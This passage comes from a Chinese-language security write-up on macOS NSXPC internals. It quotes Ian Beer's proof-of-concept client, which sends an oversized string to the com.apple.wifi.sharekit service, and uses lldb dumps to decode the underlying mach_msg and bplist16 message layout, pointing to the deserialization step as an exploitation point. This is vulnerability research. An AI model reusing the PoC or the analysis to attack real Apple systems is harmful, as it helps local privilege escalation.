@@ -1,0 +1,127 @@
+服务的漏洞利用，可能不是一种好策略。
+因此，Ian Beer 找到了一个通用利用点，那就是 NSXPC。NSXPC 是比 XPC 更上层的一种进程间通信的实现，主要为 Objective-c
+提供进程间通信的接口，它的底层基于 XPC 框架。我们先来看看 Ian Beer 提供的漏洞 poc：
+    int main() {
+      NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.wifi.sharekit" options:NSXPCConnectionPrivileged];
+      [conn setRemoteObjectInterface: [NSXPCInterface interfaceWithProtocol: @protocol(MyProtocol)]];
+      [conn resume];
+      id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
+        NSLog(@"got an error: %@", err);
+      }];
+      [obj retain];
+      NSLog(@"obj: %@", obj);
+      NSLog(@"conn: %@", conn);
+      int size = 0x10000;
+      char* long_cstring = malloc(size);
+      memset(long_cstring, 'A', size-1);
+      long_cstring[size-1] = 0;
+      NSString* long_nsstring = [NSString stringWithCString:long_cstring encoding:NSASCIIStringEncoding];
+      [obj cancelPendingRequestWithToken:long_nsstring reply:nil];
+      gets(NULL);
+      return 51;
+    }
+代码调用了 `“com.apple.wifi.sharekit”` 服务的 `cancelPendingRequestWithToken`
+接口，其第一个参数为一个长度为 0x10000,内容全是 A 的 string，我们通过调试的方法来理一下调用这个 NSXPC 接口最终到底层
+mach_msg 的 message 结构，首先断点到 mach_msg：
+      (lldb) bt
+      * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
+    * frame #0: 0x00007fffba597760 libsystem_kernel.dylib`mach_msg
+      frame #1: 0x00007fffba440feb libdispatch.dylib`_dispatch_mach_msg_send + 1195
+      frame #2: 0x00007fffba441b55 libdispatch.dylib`_dispatch_mach_send_drain + 280
+      frame #3: 0x00007fffba4582a9 libdispatch.dylib`_dispatch_mach_send_push_and_trydrain + 487
+      frame #4: 0x00007fffba455804 libdispatch.dylib`_dispatch_mach_send_msg + 282
+      frame #5: 0x00007fffba4558c3 libdispatch.dylib`dispatch_mach_send_with_result + 50
+      frame #6: 0x00007fffba6c3256 libxpc.dylib`_xpc_connection_enqueue + 104
+      frame #7: 0x00007fffba6c439d libxpc.dylib`xpc_connection_send_message + 89
+      frame #8: 0x00007fffa66df821 Foundation`-[NSXPCConnection _sendInvocation:withProxy:remoteInterface:withErrorHandler:timeout:userInfo:] + 3899
+      frame #9: 0x00007fffa66de8e0 Foundation`-[NSXPCConnection _sendInvocation:withProxy:remoteInterface:withErrorHandler:] + 32
+      frame #10: 0x00007fffa4cbf54a CoreFoundation`___forwarding___ + 538
+      frame #11: 0x00007fffa4cbf2a8 CoreFoundation`__forwarding_prep_0___ + 120
+      frame #12: 0x0000000100000da4 nsxpc_client`main + 404
+      frame #13: 0x00007fffba471235 libdyld.dylib`start + 1
+观察它的 message header 结构：
+    (lldb) x/10xg $rdi
+        0x10010bb88: 0x0000006480110013 0x0000000000001303
+        0x10010bb98: 0x100000000000150b 0x00001a0300000001
+        0x10010bba8: 0x0011000000000000 0x0000000558504321
+        0x10010bbb8: 0x0000002c0000f000 0x746f6f7200000002
+        0x10010bbc8: 0x0000800000000000 0x786f727000034000
+    typedef    struct 
+    {
+      mach_msg_bits_t    msgh_bits;
+      mach_msg_size_t    msgh_size;
+      mach_port_t        msgh_remote_port;
+      mach_port_t        msgh_local_port;
+      mach_port_name_t    msgh_voucher_port;
+      mach_msg_id_t        msgh_id;
+    } mach_msg_header_t;
+这里发送的是一个复杂消息，长度为 0x64。值得注意的是，所有 XPC 的 msgh_id 都是固定的 0x10000000，这与 MIG 接口的根据
+msgh_id 号来作 dispatch 有所不同。由于这个消息用到了大于 0x4000 的 `OS_xpc_data` 数据，因此
+message_header 后跟一个 `mach_msg_body_t` 结构，这里的值为1(偏移0x18的4字节)，意味着之后跟了一个复杂消息，而偏移
+0x1c 至 0x28 的内容是一个`mach_msg_port_descriptor_t` 结构，其定义如下：
+    typedef struct
+    {
+      mach_port_t            name;
+    // Pad to 8 bytes everywhere except the K64 kernel where mach_port_t is 8 bytes
+      mach_msg_size_t        pad1;
+      unsigned int            pad2 : 16;
+      mach_msg_type_name_t        disposition : 8;
+      mach_msg_descriptor_type_t    type : 8;
+    } mach_msg_port_descriptor_t;
+偏移 0x1c 处的 0x1a03 是一个 `mem_entry_name_port`，也就是 0x10000 的 ’A’ buffer 对应的 port。
+从 0x28 开始的 8 字节为真正的 xpc 消息的头部，最新的 mac/iOS 上，这个头信息是固定的：
+0x0000000558504321，也就是字符串 “!CPX”(XPC!的倒序)，以及版本号 0x5，接下来跟的是一个序列化过的
+`OS_xpc_dictionary` 结构：
+    (lldb) x/10xg 0x10010bbb8
+    0x10010bbb8: 0x0000002c0000f000 0x746f6f7200000002
+    0x10010bbc8: 0x0000800000000000 0x786f727000034000
+    0x10010bbd8: 0x000000006d756e79 0x0000000100004000
+如果翻译成 Human Readable 的格式，应该是这样：
+        root
+        [the data of that mem_entry_name_port]
+        proxynum
+        1
+这里可以看到，这个 serialize 后的 OS_xpc_data 并没有引用对应的 send right 信息，只是标记它是个
+DATA(0x8000)，以及它的长度 0x34000。而事实上，在 deserialize 的时候，程序会自动寻找 `mach_msg_body_t`
+中指定的复杂消息个数，并且顺序去寻找后边紧跟的 `mach_msg_port_descriptor_t` 结构，而序列化过后的 XPC 消息中出现的
+`OS_xpc_data` 与之前填入的 `mach_msg_port_descriptor_t`
+顺序是一致并且一一对应的。用一个简单明了的图来说明，就是这样：
+ NSXPC at
+mach_msg view
+看到这里，我们对 NSXPC 所对应的底层 mach_msg 结构已经有所了解。但是，这里还遗留了个问题：如果所有 XPC 的 msgh_id 都是
+0x10000000，那么接收端如何知道我调用的是哪个接口呢？其中的奥秘，就在这个 XPC Dictionary 中的 root
+字段，我们还没有看过这个字段对应的 `mem_entry_name_port` 对应的 buffer 内容是啥呢，找到这个 buffer
+后，他大概就是这个样子：
+    (lldb) x/100xg 0x0000000100440000
+    0x100440000: 0x36317473696c7062 0x00000000020070d0
+    0x100440010: 0x70d000766e697400 0x7700000000000200
+    0x100440020: 0x7d007373616c6324 0x61636f766e49534e
+    0x100440030: 0x797473006e6f6974 0x0040403a40767600
+    0x100440040: 0x6325117f00657373 0x6e65506c65636e61
+    0x100440050: 0x75716552676e6964 0x5468746957747365
+    0x100440060: 0x7065723a6e656b6f 0xff126fe0003a796c
+    0x100440070: 0x41004100410041ff 0x4100410041004100
+    0x100440080: 0x4100410041004100 0x4100410041004100
+    0x100440090: 0x4100410041004100 0x4100410041004100
+    0x1004400a0: 0x4100410041004100 0x4100410041004100
+    0x1004400b0: 0x4100410041004100 0x4100410041004100
+    0x1004400c0: 0x4100410041004100 0x4100410041004100
+    0x1004400d0: 0x4100410041004100 0x4100410041004100
+    0x1004400e0: 0x4100410041004100 0x4100410041004100
+    0x1004400f0: 0x4100410041004100 0x4100410041004100
+    0x100440100: 0x4100410041004100 0x4100410041004100
+    0x100440110: 0x4100410041004100 0x4100410041004100
+    (lldb) x/1s 0x0000000100440000
+    0x100440000: "bplist16\xffffffd0p"
+这是个 bplist16 序列化格式的 buffer，是 NSXPC 专用的，和底层 XPC 的序列化格式是有区别的。这个 buffer 被做成
+`mem_entry_name_port` 传输给接收端，而接收端直接用共享内存的方式获得这个
+buffer，并进行反序列化操作，这就创造了一个绝佳的利用点，当然这是后话。我们先看一下这个 buffer 的二进制内容：
+ bplist
+sample to call cancelPendingRequestWithToken
+这个 bplist16 格式的解析比较复杂，而且 Ian Beer 的实现里也只是覆盖了部分格式，大致转换成 Human Readable 的形式就是这样：
+        $class
+        NSInvocation
+        ty
+        v@:@@
+        se
+        cancelPendingRequestWithToken:reply:
